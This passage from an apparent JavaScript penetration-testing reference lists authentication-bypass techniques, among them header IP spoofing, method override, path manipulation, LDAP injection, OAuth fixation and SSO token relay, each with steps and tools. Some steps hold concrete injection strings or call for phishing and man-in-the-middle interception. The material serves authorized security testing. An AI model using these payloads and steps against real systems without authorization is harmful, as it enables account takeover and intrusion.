      "Test backup code format for predictability"
    ],
    tools: ["Burp Suite", "custom scripts", "curl"]
  },

  // ── Advanced Auth Bypass ──

  {
    name: "Authentication Bypass via IP Spoofing Headers",
    description: "Applications that whitelist internal IPs for authentication bypass may trust X-Forwarded-For or similar headers, which can be spoofed by external attackers.",
    steps: [
      "Access a protected endpoint normally (should be denied)",
      "Add X-Forwarded-For: 127.0.0.1 header and retry",
      "Test with X-Real-IP, X-Originating-IP, X-Client-IP, True-Client-IP",
      "Test with internal IP ranges: 10.0.0.1, 192.168.1.1, 172.16.0.1",
      "Test with IPv6 loopback: ::1"
    ],
    tools: ["curl", "Burp Suite", "custom header injection scripts"]
  },
  {
    name: "Authentication Bypass via HTTP Method Override",
    description: "Some frameworks support method override headers that change how the request is processed. Protected DELETE endpoints may be accessible via POST with X-HTTP-Method-Override.",
    steps: [
      "Send a POST request with X-HTTP-Method-Override: DELETE header",
      "Test with _method parameter in query string or body",
      "Test with X-Method-Override and X-HTTP-Method headers",
      "Check if authorization is applied to the override method",
      "Test overriding to administrative methods"
    ],
    tools: ["curl", "Burp Suite", "Postman"]
  },
  {
    name: "Authentication Bypass via URL Path Manipulation",
    description: "Path normalization differences between the authentication layer and the application can be exploited to bypass authentication using path traversal, URL encoding, or case variations.",
    steps: [
      "Test URL encoding: /api/%61dmin (encodes 'a')",
      "Test double encoding: /api/%2561dmin",
      "Test path traversal: /api/public/../admin",
      "Test case variations: /API/ADMIN, /Api/Admin",
      "Test Unicode normalization: /api/adm%C4%B1n (Turkish i)",
      "Test backslash: /api/admin\\.json",
      "Test semicolon: /api/admin;bypass=true"
    ],
    tools: ["Burp Suite", "ffuf", "custom URL manipulation scripts", "dirsearch"]
  },
  {
    name: "Authentication Bypass via Default Credentials",
    description: "Test all API interfaces (admin panels, databases, message queues, monitoring) for default credentials that are often left unchanged.",
    steps: [
      "Identify all login interfaces and services",
      "Test with vendor default credentials",
      "Test common username/password combinations",
      "Check documentation for default credentials",
      "Test with blank passwords"
    ],
    tools: ["default-credentials-cheat-sheet", "Metasploit aux/scanner modules", "custom credential testing scripts", "Nmap NSE scripts"]
  },
  {
    name: "Authentication Bypass via Registration Overwrites",
    description: "Some APIs allow registering a new account with an email that already exists, effectively overwriting the existing user's credentials or creating a duplicate that shares access.",
    steps: [
      "Check if the API allows registration with an existing email (different case, trailing spaces)",
      "Test: admin@target.com vs Admin@Target.com vs admin@target.com (with trailing space)",
      "Test with Unicode confusable characters in email",
      "Check if the original account is affected (password changed, access shared)",
      "Test if verification is required for the new registration"
    ],
    tools: ["curl", "Burp Suite", "Unicode confusable generator", "custom scripts"]
  },
  {
    name: "Password Reset Token Leak via Referrer",
    description: "Password reset pages that load external resources (scripts, images, CSS) leak the reset token in the Referer header to third-party servers.",
    steps: [
      "Trigger a password reset and obtain the reset URL",
      "Visit the reset URL and check if external resources are loaded",
      "Examine the Referer header sent to external resources",
      "Check if the reset token is included in the Referer",
      "Test with browser developer tools (Network tab)"
    ],
    tools: ["Browser developer tools", "Burp Suite", "custom Referer capture server"]
  },
  {
    name: "OAuth Token Fixation",
    description: "Similar to session fixation, an attacker can set a known OAuth state or code_verifier before the victim initiates the OAuth flow, allowing the attacker to complete the flow.",
    steps: [
      "Understand the OAuth flow used by the target",
      "If using PKCE, check if code_verifier can be pre-set",
      "If state is predictable, pre-compute the expected state value",
      "Trick the victim into starting OAuth with attacker-controlled parameters",
      "Complete the OAuth flow with the known state/verifier"
    ],
    tools: ["Burp Suite", "OAuth flow analysis", "custom phishing page"]
  },
  {
    name: "Bearer Token Confusion",
    description: "Test if the API accepts tokens from different token issuers, types, or formats. A token meant for one purpose (email verification) may be accepted for authentication.",
    steps: [
      "Collect different types of tokens from the application (auth, reset, verify, invite)",
      "Try using each token type in the Authorization: Bearer header",
      "Check if email verification tokens grant API access",
      "Check if password reset tokens can be used for authentication",
      "Test with tokens from different environments (staging token on production)"
    ],
    tools: ["curl", "Burp Suite", "Postman", "jwt.io (for JWT analysis)"]
  },
  {
    name: "LDAP Injection for Auth Bypass",
    description: "Login forms that query LDAP directories without proper input sanitization can be exploited to bypass authentication through LDAP injection.",
    steps: [
      "Identify LDAP-based authentication endpoints",
      "Test with LDAP special characters: *, (, ), \\, NUL",
      "Test username: *)(uid=*))(|(uid=* with any password",
      "Test username: admin)(&) to close the filter",
      "Test blind LDAP injection via response timing"
    ],
    tools: ["Burp Suite", "ldapsearch", "custom LDAP injection scripts", "OWASP ZAP"]
  },
  {
    name: "GraphQL Auth Bypass via Introspection",
    description: "Use GraphQL introspection to discover authentication-free mutations, undocumented queries, or alternate authentication paths not exposed in the client application.",
    steps: [
      "Run a full introspection query on the GraphQL endpoint",
      "Identify mutations that do not require authentication",
      "Look for admin queries or mutations",
      "Test each discovered query/mutation without authentication",
      "Check for alternate login mutations that skip MFA"
    ],
    tools: ["GraphQL Voyager", "InQL (Burp extension)", "graphql-cop", "Altair GraphQL Client", "curl"]
  },
  {
    name: "Token Binding Bypass",
    description: "Authentication tokens that should be bound to a specific device, IP, or client fingerprint can sometimes be used from a different context if binding is not strictly enforced.",
    steps: [
      "Obtain a valid authentication token",
      "Use the token from a different IP address",
      "Use the token from a different browser/user-agent",
      "Use the token with a different device fingerprint",
      "Check which binding attributes are actually validated"
    ],
    tools: ["curl (with different IP via proxy)", "Burp Suite", "multiple browsers"]
  },
  {
    name: "Broken Account Recovery / Security Questions",
    description: "Weak security questions with easily discoverable answers, or account recovery flows that do not properly verify identity, allow unauthorized account access.",
    steps: [
      "Enumerate available security questions",
      "Research answers through OSINT (social media, public records)",
      "Test if security questions are case-sensitive",
      "Test if there are limits on answer attempts",
      "Check if recovery bypasses MFA"
    ],
    tools: ["OSINT tools", "social media analysis", "Burp Suite", "custom scripts"]
  },
  {
    name: "SSO Token Relay Attack",
    description: "Intercept SSO tokens during the redirect flow between Identity Provider and Service Provider and use them to authenticate as the victim.",
    steps: [
      "Set up a network position to intercept SSO redirects (WiFi MitM, DNS hijack)",
      "Capture the SSO token/assertion during the redirect",
      "Replay the token to the Service Provider before the victim",
      "Check if the token is single-use",
      "Check if the token includes IP binding"
    ],
    tools: ["mitmproxy", "Burp Suite", "Wireshark", "bettercap"]
  }
];


// ============================================================================
// Module Exports
// ============================================================================

if (typeof module !== "undefined" && module.exports) {
  module.exports = {
    API_VULNS,
    API_TESTING_CHECKLIST,
    GRAPHQL_ATTACKS,
    REST_ATTACKS,
    WEBSOCKET_ATTACKS,
    AUTH_BYPASS
  };
}
